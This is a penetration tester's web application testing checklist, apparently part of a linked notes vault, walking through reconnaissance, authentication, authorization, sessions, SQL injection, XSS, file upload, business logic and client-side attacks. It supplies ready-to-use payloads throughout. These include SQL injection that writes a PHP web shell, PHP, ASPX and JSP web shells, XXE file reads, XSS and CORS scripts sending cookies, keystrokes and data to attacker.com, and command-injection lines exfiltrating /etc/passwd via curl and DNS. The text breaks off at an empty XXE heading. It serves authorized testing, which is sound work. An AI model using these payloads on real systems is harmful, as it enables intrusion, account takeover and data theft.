# Web Application Technical Testing Checklist

Systematic methodology for hands-on security testing of web applications. Work through phases sequentially, documenting all attempts in [[WEB-03-Request-Tracker]].

Related: [[WEB-01-Admin-Checklist]] | [[WEB-04-Evidence-Collection]] | [[WEB-05-Reporting-Template]]

---

## Testing Phases Overview

1. [[#Phase 1 Reconnaissance & Mapping]] (30-60 min)
2. [[#Phase 2 Authentication Testing]] (45-90 min)
3. [[#Phase 3 Authorization Testing]] (1-2 hours)
4. [[#Phase 4 Session Management]] (30-60 min)
5. [[#Phase 5 Input Validation SQL Injection]] (1-2 hours)
6. [[#Phase 6 Cross-Site Scripting XSS]] (1-2 hours)
7. [[#Phase 7 File Upload Testing]] (45-90 min)
8. [[#Phase 8 Business Logic Testing]] (1-2 hours)
9. [[#Phase 9 Client-Side Testing]] (45-60 min)
10. [[#Phase 10 Additional Injection Attacks]] (1-2 hours)

---

## Phase 1: Reconnaissance & Mapping

**Objective**: Understand application structure, technology stack, and attack surface

### Burp Setup
- [ ] Configure browser to proxy through Burp (127.0.0.1:8080)
- [ ] Import Burp CA certificate in browser
- [ ] Verify traffic capturing correctly
- [ ] Create new Burp project: `[ClientName]_WebApp_[Date]`
- [ ] Set scope to target domain(s)
- [ ] Enable JavaScript analysis in Burp

### Passive Reconnaissance

#### Google Dorking
- [ ] `site:target.com filetype:pdf` (documents)
- [ ] `site:target.com inurl:admin` (admin panels)
- [ ] `site:target.com inurl:login` (login pages)
- [ ] `site:target.com inurl:upload` (upload functionality)
- [ ] `site:target.com ext:php` (technology fingerprinting)
- [ ] `site:target.com intitle:"index of"` (directory listings)

#### Shodan/Censys
- [ ] Search for target domain
- [ ] Note open ports and services
- [ ] Check SSL/TLS certificate details
- [ ] Identify related infrastructure

#### GitHub/GitLab Reconnaissance
- [ ] Search for organization repos
- [ ] Look for leaked credentials: `"target.com" password`
- [ ] Look for API keys: `"target.com" api_key`
- [ ] Check commit history for secrets
- [ ] Review issues/pull requests for vulns

### Active Enumeration

#### Subdomain Discovery
```bash
# Using sublist3r
sublist3r -d target.com

# Using amass
amass enum -d target.com

# DNS brute force
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

#### Technology Fingerprinting
- [ ] **Wappalyzer** (browser extension)
- [ ] **WhatWeb**:
  ```bash
  whatweb https://target.com
  ```
- [ ] **Burp headers** - Review HTTP response headers
- [ ] **Nikto scan**:
  ```bash
  nikto -h https://target.com
  ```
- [ ] **Nmap web scripts**:
  ```bash
  nmap -p 80,443 --script http-enum target.com
  ```

**Document**:
- [ ] Web server type/version
- [ ] Programming language
- [ ] Framework
- [ ] JavaScript libraries
- [ ] CMS (if applicable)

#### Directory/File Enumeration
```bash
# Gobuster
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,bak,old

# DirBuster (GUI alternative)
# OWASP ZAP Spider

# Feroxbuster (recursive with smart filtering)
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

**Common paths to check**:
```
/admin
/administrator
/login
/wp-admin (WordPress)
/phpmyadmin
/backup
/old
/test
/dev
/.git
/.svn
/.env
/config
/upload
/uploads
/files
/api
```

#### Application Spidering
- [ ] **Burp Spider**: Right-click target â†' Spider this host
- [ ] **Manual browsing**: Click through all features
- [ ] **ZAP Spider**: Automated crawling
- [ ] **Authenticated spider**: Login first, then spider

**Document all**:
- [ ] Entry points (forms, parameters)
- [ ] File upload locations
- [ ] Admin panels
- [ ] API endpoints
- [ ] Hidden functionality

#### Robots.txt & Sitemap
- [ ] Check `/robots.txt`
- [ ] Check `/sitemap.xml`
- [ ] Review disallowed paths
- [ ] Test accessing disallowed paths

### Parameter Discovery
- [ ] Use Burp **Param Miner** extension
- [ ] Use **Arjun**:
  ```bash
  arjun -u https://target.com/page
  ```
- [ ] Fuzz for hidden parameters
- [ ] Check JavaScript files for parameter names

**Screenshot**: [[WEB-04-Evidence-Collection#Application Map]]

---

## Phase 2: Authentication Testing

**Objective**: Test login mechanisms, password policies, and account recovery

Reference: [[WEB-06-Quick-Reference#Authentication Attacks]]

### Username Enumeration

#### Login Page Testing
- [ ] **Different error messages**:
  ```
  Valid user, wrong password: "Incorrect password"
  Invalid user: "User not found"
  ```
- [ ] **Timing differences**:
  - Valid user: longer response (password hash check)
  - Invalid user: faster response
- [ ] **Status code differences** (200 vs 401 vs 403)
- [ ] **Response size differences**

#### Registration Page
- [ ] Try registering existing username
- [ ] Check error: "Username already taken" vs generic error

#### Password Reset
- [ ] Request reset for known user vs unknown user
- [ ] Check for different responses

**Tool**: Burp Intruder with username list

**Log**: [[WEB-03-Request-Tracker#Username Enum]]

### Credential Testing

#### Default Credentials
Try common defaults:
```
admin:admin
admin:password
root:root
test:test
guest:guest
```

Check application-specific defaults (if known CMS/framework)

#### Weak Password Policy
- [ ] Register account with weak password: `password`, `123456`, `abc`
- [ ] Test minimum length
- [ ] Test complexity requirements
- [ ] Test dictionary words
- [ ] Test username as password

#### Password Reset Token Analysis
- [ ] Request password reset
- [ ] Analyze reset token:
  - [ ] Token length and entropy
  - [ ] Predictability (timestamp-based?)
  - [ ] Expiration time
  - [ ] One-time use?
  - [ ] Valid for multiple accounts?
- [ ] Test token reuse after password change
- [ ] Test token reuse after time expires

**Example weak token**:
```
Reset link: /reset?token=user123_1234567890
[username]_[timestamp] = predictable!
```

### Brute Force Protection

#### Rate Limiting Test
- [ ] Send 10+ failed login attempts rapidly
- [ ] Check for:
  - [ ] Account lockout
  - [ ] IP-based blocking
  - [ ] CAPTCHA requirement
  - [ ] Delay between attempts
- [ ] Document threshold and lockout duration

#### Account Lockout Bypass
- [ ] Test with different username case: `Admin` vs `admin`
- [ ] Test with extra whitespace: ` admin`
- [ ] Test with null byte: `admin%00`
- [ ] Lockout on username but not on IP? Try multiple usernames
- [ ] Lockout on IP but not username? Use proxy rotation

#### CAPTCHA Bypass
- [ ] Remove CAPTCHA parameter from request
- [ ] Reuse old CAPTCHA token
- [ ] Send empty CAPTCHA value
- [ ] Test CAPTCHA on client-side only
- [ ] OCR tools: `tesseract` for weak CAPTCHAs

### Multi-Factor Authentication (MFA)

If MFA is present:
- [ ] **Bypass MFA**:
  - [ ] Direct access to post-login page (forced browsing)
  - [ ] Session fixation before MFA
  - [ ] Race condition (multiple simultaneous logins)
- [ ] **Brute force MFA code**:
  - [ ] 6-digit code = 1,000,000 combinations
  - [ ] Check rate limiting on MFA endpoint
  - [ ] Check for MFA code in response/email
- [ ] **MFA code reuse**:
  - [ ] Use same code multiple times
  - [ ] Use expired code
- [ ] **TOTP seed backup**:
  - [ ] Check if QR code is re-displayed
  - [ ] Check if backup codes are regenerated

### OAuth/SSO Testing

If OAuth is used:
- [ ] **Redirect URI manipulation**:
  ```
  /oauth/authorize?redirect_uri=https://attacker.com
  /oauth/authorize?redirect_uri=https://target.com@attacker.com
  /oauth/authorize?redirect_uri=https://target.com.attacker.com
  ```
- [ ] **State parameter**:
  - [ ] Missing state parameter (CSRF)
  - [ ] Predictable state value
  - [ ] State reuse
- [ ] **Authorization code**:
  - [ ] Code reuse
  - [ ] Code leakage via Referer header
  - [ ] Code interception

**Screenshot**: [[WEB-04-Evidence-Collection#Auth Bypass]]

---

## Phase 3: Authorization Testing

**Objective**: Test for privilege escalation and access control bypasses

Reference: [[WEB-06-Quick-Reference#IDOR Attacks]]

### Horizontal Privilege Escalation (IDOR)

**Pattern**: User A accessing User B's data

#### Setup
- [ ] Create two test accounts (User A and User B)
- [ ] Note User A's identifier (ID, username, email)
- [ ] Note User B's identifier
- [ ] Identify all user-specific resources

#### IDOR Testing Checklist
For EVERY user-specific endpoint:

- [ ] View profile: `/user/profile?id=123` â†' change to `124`
- [ ] Edit profile: `POST /user/update` with `user_id=123` â†' change to `124`
- [ ] View documents: `/user/documents/456` â†' change to `457`
- [ ] Delete items: `DELETE /user/item/789` â†' change to other user's item
- [ ] Messages: `/user/messages/inbox` with different user context
- [ ] Settings: `/user/settings` with different user ID

**Common ID locations**:
```
URL path: /user/123/profile
Query param: /profile?user_id=123
POST body: {"user_id": 123}
Cookie: user_id=123
Hidden form field: <input type="hidden" name="user_id" value="123">
```

**ID manipulation techniques**:
- [ ] Sequential IDs: 1, 2, 3, 100, 101
- [ ] Negative IDs: -1, -2
- [ ] Large numbers: 999999, 2147483647
- [ ] UUIDs: Try with different user's UUID
- [ ] Encoded IDs: Base64, hex (decode, change, re-encode)
- [ ] Array injection: `user_id[]=123&user_id[]=124`

**Burp Intruder automation**:
1. Send request to Intruder
2. Mark ID parameter: `/user/Â§123Â§/profile`
3. Payload type: Numbers (1-1000)
4. Start attack
5. Analyze responses for successful access

**Log**: [[WEB-03-Request-Tracker#IDOR]]

### Vertical Privilege Escalation

**Pattern**: Regular user accessing admin functions

#### Admin Panel Discovery
- [ ] Forced browsing:
  ```
  /admin
  /administrator  
  /admin.php
  /admin/dashboard
  /backend
  /manager
  /cp (control panel)
  /console
  /staff
  ```
- [ ] Fuzzing with wordlist:
  ```bash
  gobuster dir -u https://target.com -w admin-panels.txt
  ```
- [ ] Check JavaScript files for admin URLs
- [ ] Check robots.txt for admin paths

#### Function-Level Authorization Testing
- [ ] Access admin functions as regular user:
  - [ ] User management endpoints
  - [ ] System configuration
  - [ ] Reporting functions
  - [ ] Backup/restore
  - [ ] Database management

**Example tests**:
```http
# As regular user, try:
GET /admin/users HTTP/1.1
GET /admin/config HTTP/1.1
POST /admin/users/create HTTP/1.1
DELETE /admin/users/123 HTTP/1.1
```

#### Parameter Tampering
- [ ] Add `admin=true` to request
- [ ] Add `role=admin` to POST body
- [ ] Modify hidden form fields:
  ```html
  <input type="hidden" name="role" value="user">
  Change to: value="admin"
  ```
- [ ] Change user ID to admin ID in request

### Forced Browsing

**Direct object reference without proper checks**:

- [ ] Access URLs without authentication:
  ```
  /user/dashboard (should require login)
  /user/documents/sensitive.pdf
  /admin (should require admin)
  ```
- [ ] Enumerate all pages in site map
- [ ] Try accessing each page unauthenticated
- [ ] Try accessing admin pages as regular user

#### Path Traversal in Authorization
- [ ] `/user/../admin`
- [ ] `/user/%2e%2e/admin` (encoded)
- [ ] `/user/./././admin`

**Screenshot**: [[WEB-04-Evidence-Collection#Privilege Escalation]]

---

## Phase 4: Session Management

**Objective**: Test session token security and management

### Cookie Analysis

#### Cookie Inspection
For each cookie, document:
- [ ] Name: ________________
- [ ] Value: ________________
- [ ] Length/entropy: ________________
- [ ] Flags:
  - [ ] HttpOnly: Yes / No
  - [ ] Secure: Yes / No
  - [ ] SameSite: [None / Lax / Strict / Not set]
- [ ] Domain: ________________
- [ ] Path: ________________
- [ ] Expiration: ________________

**Security issues to check**:
- [ ] Missing HttpOnly (vulnerable to XSS theft)
- [ ] Missing Secure flag (sent over HTTP)
- [ ] Missing SameSite (CSRF vulnerability)
- [ ] Predictable session ID
- [ ] Long expiration (years)

#### Session Token Predictability
- [ ] Generate multiple session tokens (5-10)
- [ ] Look for patterns:
  - [ ] Sequential numbers
  - [ ] Timestamp-based
  - [ ] User ID encoded
  - [ ] Short length (<128 bits)
- [ ] Use **Burp Sequencer** to analyze randomness:
  1. Right-click request with token
  2. Send to Sequencer
  3. Mark token parameter
  4. Capture 100+ tokens
  5. Analyze results

**Weak session token example**:
```
session=user123_1640000000_abc123
[username]_[timestamp]_[short random] = PREDICTABLE
```

### Session Fixation

**Attack**: Force victim to use attacker-controlled session ID

#### Test Steps
1. Get session cookie before login: `SESSID=attacker123`
2. Login with this session cookie
3. Check if same session cookie is used after login
4. If yes â†' Session fixation vulnerability!

**Secure behavior**: New session ID should be issued after login

#### Test via URL parameter
- [ ] Check if session ID can be set via URL:
  ```
  /login?SESSID=attacker123
  ```
- [ ] Login and verify if this session ID is accepted

### Concurrent Sessions

- [ ] Login with User A from Browser 1
- [ ] Login with same User A from Browser 2
- [ ] Both sessions active? Potential issue
- [ ] Logout from Browser 1
- [ ] Check if Browser 2 session still valid

**Secure behavior**: Either limit concurrent sessions OR allow but track them

### Session Timeout

#### Idle Timeout
- [ ] Login and note session cookie
- [ ] Wait for idle timeout period
- [ ] Try accessing authenticated page
- [ ] Session should be invalid

#### Absolute Timeout
- [ ] Login and continuously use application
- [ ] Check if session expires after absolute time (e.g., 8 hours)

#### Logout Function
- [ ] Login and note session cookie
- [ ] Click logout
- [ ] Try reusing old session cookie
- [ ] Should be invalid (server-side invalidation)

**Common issue**: Client-side logout only (cookie cleared but still valid server-side)

**Test**:
```bash
# Before logout
curl -H "Cookie: SESSID=abc123" https://target.com/dashboard
# Should work

# After logout (save cookie before logout!)
curl -H "Cookie: SESSID=abc123" https://target.com/dashboard
# Should NOT work (should redirect to login or 401)
```

**Log**: [[WEB-03-Request-Tracker#Session Issues]]

---

## Phase 5: Input Validation - SQL Injection

**Objective**: Test for SQL injection in all input points

Reference: [[WEB-06-Quick-Reference#SQL Injection]]

### Identifying SQL Injection

#### Quick Detection
For EACH input field, URL parameter, and HTTP header:

**Test payloads**:
```sql
'
"
`
')
")
`)
';
";
`;
' OR '1'='1
' OR 1=1--
' OR 'a'='a
```

**Look for**:
- [ ] Database errors in response
- [ ] Different behavior (true vs false conditions)
- [ ] Time delays (for blind SQLi)

#### Error-Based Detection

**MySQL errors**:
```
You have an error in your SQL syntax
Warning: mysql_fetch_array()
```

**PostgreSQL errors**:
```
ERROR: syntax error at or near
```

**MSSQL errors**:
```
Unclosed quotation mark
Incorrect syntax near
```

**Oracle errors**:
```
ORA-00933: SQL command not properly ended
```

### Testing All Entry Points

#### URL Parameters
```
https://target.com/product?id=1'
https://target.com/search?q=test'
https://target.com/user?name=admin'--
```

#### POST Body
```http
POST /login HTTP/1.1

username=admin'&password=pass
```

```json
{
  "username": "admin'",
  "password": "test"
}
```

#### HTTP Headers
```http
GET /page HTTP/1.1
User-Agent: Mozilla/5.0'
Referer: https://evil.com'
X-Forwarded-For: 1.2.3.4'
Cookie: session=abc123'; DROP TABLE users--
```

#### File Upload
- [ ] Filename: `test.jpg' OR '1'='1--.jpg`
- [ ] File content with SQL payload
- [ ] Metadata fields

### SQL Injection Types

#### Boolean-Based Blind SQLi
```sql
# True condition (normal response)
' OR '1'='1'--
' OR 1=1--

# False condition (different response)
' AND '1'='2'--
' AND 1=2--
```

**Test**:
```
/product?id=1' AND 1=1--  (returns product)
/product?id=1' AND 1=2--  (no product)
```

Different responses = Boolean-based SQLi

#### Time-Based Blind SQLi
```sql
# MySQL
'; WAITFOR DELAY '00:00:05'--
' OR SLEEP(5)--

# PostgreSQL
'; SELECT pg_sleep(5)--

# MSSQL
'; WAITFOR DELAY '00:00:05'--

# Oracle
'; BEGIN DBMS_LOCK.SLEEP(5); END;--
```

**Test**: If response takes 5 seconds â†' Time-based SQLi

#### Union-Based SQLi

**Step 1**: Determine number of columns
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
(Keep going until error)
```

**Step 2**: Find injectable columns
```sql
# If 3 columns:
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

**Step 3**: Extract data
```sql
# MySQL
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,user(),NULL--
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='database'--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username,password FROM users--

# MSSQL
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,name,NULL FROM sys.databases--

# PostgreSQL
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,current_database(),NULL--

# Oracle
' UNION SELECT NULL,banner,NULL FROM v$version--
```

### SQL Injection Exploitation

#### Manual Exploitation
```sql
# Enumerate databases
' UNION SELECT NULL,schema_name FROM information_schema.schemata--

# Enumerate tables
' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='app_db'--

# Enumerate columns
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--

# Extract data
' UNION SELECT username,password FROM users--

# Read files (if permissions)
' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--

# Write files (if permissions)
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
```

#### Automated with SQLMap
```bash
# Basic scan
sqlmap -u "https://target.com/product?id=1"

# With POST data
sqlmap -u "https://target.com/login" --data="username=admin&password=pass"

# With authentication
sqlmap -u "https://target.com/page" --cookie="SESSION=abc123"

# Enumerate databases
sqlmap -u "https://target.com/product?id=1" --dbs

# Enumerate tables
sqlmap -u "https://target.com/product?id=1" -D database_name --tables

# Dump table
sqlmap -u "https://target.com/product?id=1" -D database_name -T users --dump

# Get shell (if permissions)
sqlmap -u "https://target.com/product?id=1" --os-shell
```

**Screenshot**: [[WEB-04-Evidence-Collection#SQL Injection]]

**Log**: [[WEB-03-Request-Tracker#SQLi]]

### NoSQL Injection

For MongoDB and other NoSQL databases:

#### Authentication Bypass
```json
# Normal login
{"username": "admin", "password": "pass"}

# NoSQL injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

#### Query parameter injection
```
?username[$ne]=null&password[$ne]=null
?username[$gt]=&password[$gt]=
```

#### Data extraction
```json
{"username": {"$regex": "^a"}}  # Users starting with 'a'
{"username": {"$regex": "^ad"}} # Narrowing down
```

---

## Phase 6: Cross-Site Scripting (XSS)

**Objective**: Test for XSS in all user-controllable output

Reference: [[WEB-06-Quick-Reference#XSS Payloads]]

### XSS Detection Basics

#### Reflected XSS Test
Inject in URL parameters, search fields, error messages:

**Basic payloads**:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
'"><script>alert(1)</script>
```

**Look for**:
- [ ] Payload appears in response unencoded
- [ ] Alert box pops up
- [ ] JavaScript executes

#### Stored XSS Test
Inject in:
- [ ] Profile fields (name, bio, location)
- [ ] Comments
- [ ] Forum posts
- [ ] Messages
- [ ] File names
- [ ] Any persistent input

**Save payload and verify**:
1. Submit XSS payload
2. View saved data
3. Check if JavaScript executes

#### DOM-Based XSS Test
Check JavaScript code for unsafe sinks:
```javascript
// Unsafe patterns
document.write(location.hash)
element.innerHTML = location.hash
eval(location.hash)
```

**Test**:
```
https://target.com/page#<img src=x onerror=alert(1)>
```

### Bypassing XSS Filters

#### Encoding Bypasses
```html
<!-- HTML Entity Encoding -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Double URL Encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Hex -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

#### Tag/Keyword Bypasses
```html
<!-- If <script> is blocked -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input onfocus=alert(1) autofocus>

<!-- If alert is blocked -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>eval('al'+'ert(1)')</script>
<script>eval(atob('YWxlcnQoMSk='))</script>  # Base64: alert(1)

<!-- If parentheses blocked -->
<script>onerror=alert;throw 1</script>
<script>alert`1`</script>

<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
```

#### Context-Specific Bypasses

**In HTML attribute**:
```html
<!-- If inside <input value="USER_INPUT"> -->
"><script>alert(1)</script>
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
```

**In JavaScript string**:
```html
<!-- If inside <script>var x = "USER_INPUT";</script> -->
"; alert(1); //
'; alert(1); //
\'; alert(1); //
```

**In HTML comment**:
```html
<!-- USER_INPUT -->
<!-- If input goes here: -->
--><script>alert(1)</script><!--
```

### XSS Exploitation

#### Session Stealing
```html
<script>
document.location='https://attacker.com/steal?cookie='+document.cookie
</script>

<script>
new Image().src='https://attacker.com/steal?cookie='+document.cookie
</script>
```

#### Keylogging
```html
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/log?key='+e.key)
}
</script>
```

#### Phishing
```html
<script>
document.body.innerHTML = `
<h1>Session Expired</h1>
<form action="https://attacker.com/phish">
  Username: <input name="user"><br>
  Password: <input name="pass" type="password"><br>
  <input type="submit" value="Login">
</form>
`
</script>
```

### Automated XSS Testing

#### XSStrike
```bash
xsstrike -u "https://target.com/page?param=test"
```

#### Dalfox
```bash
dalfox url "https://target.com/page?param=test"
```

#### Burp Scanner
- Right-click request â†' Scan
- Configure scan to include XSS checks

**Log**: [[WEB-03-Request-Tracker#XSS]]

**Screenshot**: [[WEB-04-Evidence-Collection#XSS Proof]]

---

## Phase 7: File Upload Testing

**Objective**: Test for unrestricted file upload and related vulnerabilities

Reference: [[WEB-06-Quick-Reference#File Upload Bypass]]

### File Upload Discovery
- [ ] Identify all file upload points
- [ ] Document for each:
  - [ ] Allowed file types: ________________
  - [ ] Max file size: ________________
  - [ ] Upload directory: ________________
  - [ ] File naming: Original / Renamed / Hashed

### File Type Validation Bypass

#### Extension Bypasses
```
# Double extensions
shell.php.jpg
shell.jpg.php

# Null byte injection
shell.php%00.jpg
shell.php\x00.jpg

# Case variation
shell.PhP
shell.pHp

# Alternate extensions
.phtml, .php3, .php4, .php5, .phar
.jsp, .jspx
.asp, .aspx, .cer, .asa

# Add trailing dot/space (Windows)
shell.php.
shell.php[space]

# Special characters
shell.php::$DATA (Windows NTFS alternate data stream)
```

#### MIME Type Bypass
```http
# Upload PHP file but change Content-Type
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- Lie about type

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

#### Magic Bytes Bypass
```
# If validation checks file header (magic bytes)
# Add JPEG header to PHP file

File: shell.php
Content:
ÿØÿà JFIF     <-- JPEG magic bytes (hex: FF D8 FF E0)
<?php system($_GET['cmd']); ?>
```

### Malicious File Upload

#### PHP Web Shell
```php
<?php system($_GET['cmd']); ?>

# Upload as: shell.php
# Access: /uploads/shell.php?cmd=whoami
```

#### ASPX Web Shell
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% 
  Process.Start("cmd.exe", "/c " + Request["cmd"]).WaitForExit();
%>
```

#### JSP Web Shell
```jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
%>
```

### Path Traversal in File Upload

#### Filename Manipulation
```
# Try to upload outside intended directory
filename="../../../../../../var/www/html/shell.php"
filename="..\..\..\inetpub\wwwroot\shell.aspx"
filename="..%2f..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php"
```

### XXE via File Upload

#### SVG XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Upload as: `xxe.svg`

#### DOCX XXE
Unzip DOCX, edit `word/document.xml`:
```xml
<!DOCTYPE doc [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<document>&xxe;</document>
```

Rezip and upload.

### Testing Upload Execution

#### Direct Access
1. Upload malicious file
2. Note upload path (check response or error messages)
3. Access directly: `/uploads/shell.php`

#### Forced Execution via Directory Traversal
```
# If uploads are in non-executable directory
# Try to upload to executable directory

filename="../shell.php"  (goes one level up)
filename="../../var/www/html/shell.php"
```

### File Overwrite

#### Overwrite Existing Files
```
# Try to overwrite critical files
filename="index.php"
filename="config.php"
filename=".htaccess"
filename="web.config"
```

#### .htaccess Upload
```apache
# Upload as .htaccess to make all files executable

AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg
```

Then upload PHP code as `.jpg`

**Log**: [[WEB-03-Request-Tracker#File Upload]]

**Screenshot**: [[WEB-04-Evidence-Collection#File Upload Exploit]]

---

## Phase 8: Business Logic Testing

**Objective**: Exploit flaws in application workflows and business rules

Reference: [[WEB-06-Quick-Reference#Business Logic]]

### Price Manipulation

#### Negative Prices
```http
POST /cart/update HTTP/1.1

item_id=123&quantity=1&price=-100
```

#### Decimal Manipulation
```
price=0.01
price=0.001
quantity=1.5 (if not expecting decimals)
```

#### Currency Manipulation (if multi-currency)
```http
# Order in cheap currency, pay in expensive currency
cart_currency=USD&payment_currency=JPY
```

#### Parameter Tampering
```http
# Capture checkout request
POST /checkout HTTP/1.1

total=100&discount=0&items=[...]

# Modify
total=1&discount=99&items=[...]
```

### Workflow Bypass

#### Multi-Step Process Bypass
```
Normal flow: step1 â†' step2 â†' step3 â†' complete

Test:
- Skip to step3 directly
- Go step1 â†' step3 (skip step2)
- Go backwards: step3 â†' step1
- Repeat step2 multiple times
```

**Example: E-commerce**
```
Normal: add to cart â†' checkout â†' payment â†' confirm

Exploit: 
- add to cart â†' confirm (skip payment)
- add to cart â†' modify price â†' payment â†' confirm
```

#### Coupon/Promo Code Abuse
- [ ] Apply same coupon multiple times
- [ ] Apply expired coupon
- [ ] Stack incompatible coupons
- [ ] Negative coupon value
- [ ] Coupon code enumeration: `SAVE10`, `SAVE20`, `SAVE2024`

### Race Conditions

**Setup**: Need to send simultaneous requests

#### Using Burp Turbo Intruder
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
        requestsPerConnection=1,
        pipeline=False
    )
    
    # Send 10 simultaneous requests
    for i in range(10):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

#### Race Condition Scenarios

**Double-spend voucher**:
```
User has: 1x $50 voucher
Send 10 simultaneous redemption requests
If vulnerable: $500 credit (used voucher 10 times)
```

**Over-withdraw money**:
```
User balance: $100
Send 5 simultaneous withdrawal requests for $100 each
If vulnerable: Withdrew $500 (but only had $100)
```

**Bypass inventory limit**:
```
Item stock: 5 remaining
Send 20 simultaneous purchase requests
If vulnerable: Sold 20 items (oversold by 15)
```

### Account Enumeration

#### Registration
- [ ] Try registering existing username/email
- [ ] Check response differences:
  ```
  "Email already exists" vs "Registration failed"
  ```

#### Password Reset
- [ ] Request reset for valid vs invalid email
- [ ] Timing difference
- [ ] Different responses

#### Login Error Messages
- [ ] "Invalid username" vs "Invalid password"
- [ ] "Account locked" (confirms account exists)

### Referral/Reward Abuse

- [ ] Self-referral: Create account with own referral code
- [ ] Loop referrals: User A refers User B, User B refers User A
- [ ] Automated account creation for referral bonuses
- [ ] Modify referral code to high-value user

**Log**: [[WEB-03-Request-Tracker#Business Logic]]

---

## Phase 9: Client-Side Testing

**Objective**: Test JavaScript security and client-side vulnerabilities

### DOM-Based XSS

**Unsafe JavaScript patterns**:
```javascript
// Unsafe sinks
document.write(source)
element.innerHTML = source
eval(source)
setTimeout(source)
setInterval(source)

// Unsafe sources
location.hash
location.search
document.referrer
```

**Testing**:
```
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/page?search=<img src=x onerror=alert(1)>
```

### JavaScript Security Review

#### Source Code Review
- [ ] View all JavaScript files in Burp > Target > Site map
- [ ] Look for:
  - [ ] Hardcoded secrets (API keys, passwords)
  - [ ] Sensitive logic (crypto, auth)
  - [ ] Admin functionality
  - [ ] Hidden features
  - [ ] Debug/test code
  - [ ] Comments with sensitive info

**Tool**: Extract JavaScript:
```bash
# LinkFinder - find endpoints in JS
python linkfinder.py -i https://target.com -o results.html

# Retire.js - find vulnerable libraries
retire --js --jspath /path/to/js
```

### WebSocket Testing

If WebSockets are used:

#### Connection Hijacking
- [ ] Intercept WebSocket connection in Burp
- [ ] Replay messages
- [ ] Modify messages
- [ ] Check for authentication

#### Message Injection
```json
# Normal message
{"type": "chat", "message": "Hello"}

# Inject XSS
{"type": "chat", "message": "<img src=x onerror=alert(1)>"}

# Inject commands
{"type": "admin_command", "action": "delete_user", "user_id": 123}
```

### Clickjacking

#### Test for X-Frame-Options
```bash
curl -I https://target.com | grep X-Frame-Options
```

If missing or set to `ALLOW`, create PoC:
```html
<iframe src="https://target.com/delete-account" style="opacity:0.1; position:absolute; top:0; left:0; width:100%; height:100%"></iframe>
<button style="position:absolute; top:100px; left:100px;">Click for free money!</button>
```

### CORS Misconfiguration

#### Test CORS Headers
```http
GET /api/userinfo HTTP/1.1
Origin: https://evil.com
```

**Look for response**:
```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

If wildcard origin with credentials:
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Exploit**:
```html
<script>
fetch('https://target.com/api/userinfo', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  fetch('https://attacker.com/steal?data='+JSON.stringify(data))
})
</script>
```

**Log**: [[WEB-03-Request-Tracker#Client-Side]]

---

## Phase 10: Additional Injection Attacks

### Command Injection

**Test in any field that might execute system commands**:
- Filename inputs
- IP address inputs
- URL inputs
- Email inputs
- Search fields

**Payloads**:
```bash
; whoami
| whoami
& whoami
&& whoami
|| whoami
` whoami `
$( whoami )

# Blind command injection (no output)
; sleep 5
| ping -c 5 127.0.0.1

# Data exfiltration
; curl https://attacker.com?data=$(cat /etc/passwd | base64)
; nslookup $(whoami).attacker.com
```

**Common vulnerable parameters**:
```
ip=127.0.0.1
email=test@example.com
url=https://example.com
filename=document.pdf
```

### XXE (XML External Entity)

